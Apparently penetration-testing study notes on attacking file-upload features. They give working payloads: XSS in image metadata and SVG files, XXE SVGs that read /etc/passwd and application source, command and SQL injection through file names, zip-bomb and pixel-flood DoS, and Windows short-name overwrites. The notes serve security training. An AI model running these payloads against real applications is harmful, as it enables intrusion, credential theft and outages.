### XSS
Many file types may allow us to introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them.

1. Upload an HTML file with JavaScript code which gets rendered when visited
2. Upload an image that has a XSS payload in the metadata as a comment. Useful for when a file/image metadata like the `author` is shown on the page
 ```shell
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' Pwn3d.jpg
```
3. Embed XSS into a SVG images XML data.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
### XXE
Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server.

> [!NOTE] Note
> This can be very useful for reading source code to find more hidden directories, embedded SQL passwords, API keys and more 


Read the contents of `/etc/passwd` using a malicious SVG image
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
Read source code of web application
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
### DoS
1. Upload a zip bomb
2. Upload a huge image (`Pixel Flood`)
3. Upload to /etc/passwd using directory traversal
### Injections in File Names
Command injection into file names:
If we name a file `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. `mv file /tmp`), then our file name would inject the `whoami` command

The same can be done with XSS by naming the file `<script>alert(window.origin);</script>` or even SQLi by naming the file `file';select+sleep(5);--.jpg`
### Upload Directory Disclosure
n some file upload forms, like a feedback form or a submission form, we may not have access to the link of our uploaded file and may not know the uploads directory.We can fuzz for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code.

We can also try forcing error messages to reveal information. We can use to cause such errors is uploading a file with a name that already exists or sending two identical requests simultaneously. This may lead the web server to show an error that it could not write the file, which may disclose the uploads directory. We may also try uploading a file with an overly long name (e.g., 5,000 characters). If the web application does not handle this correctly, it may also error out and disclose the upload directory
### Windows-specific Attacks
Special characters  (`|`, `<`,`>`, or `?`) can be used to create errors and disclose the upload directory.

Older versions of Windows were limited to a short length for file names, so they used a Tilde character (`~`) to complete the file name. We can use this to overwrite existing files or refer to files that don't exist https://en.wikipedia.org/wiki/8.3_filename

For example, to refer to a file called (`hackthebox.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`). As Windows still supports this convention, we can write a file called (e.g. `WEB~.CONF`) to overwrite the `web.conf` file. Similarly, we may write a file that replaces sensitive system files.